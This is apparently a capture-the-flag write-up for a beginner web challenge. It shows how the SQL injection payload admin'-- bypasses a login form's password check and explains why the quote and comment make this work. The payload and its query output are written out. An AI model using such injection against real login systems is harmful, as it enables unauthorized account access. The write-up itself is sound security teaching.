### Description

> Can you login to this website?

SQLi, or SQL Injecton, is a form of code injection into a SQL database to access information that is not intended to be accessed.

We need to login as `admin`.

---

## Solution

If you try to login normally, your username, password, and the SQL query is displayed.

```
username: admin
password: pass
SQL query: SELECT * FROM users WHERE name='admin' AND password='pass'

Login failed.
```

Let's try a simple injection to see if there are any filters:

```
username: admin'--
password: pass
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='pass'
Logged in! But can you see the flag, it is in plainsight.
```

That was easy. The reason this works is because the quotation in `admin'--` closes off the quotation in the query. The `--` is a comment in SQL, which means the rest of the query is never evaluated. Now, the query simply finds users named `admin`, regardless of the password.

The flag can be found in a hidden `<p>` element. Use the inspector to see it.
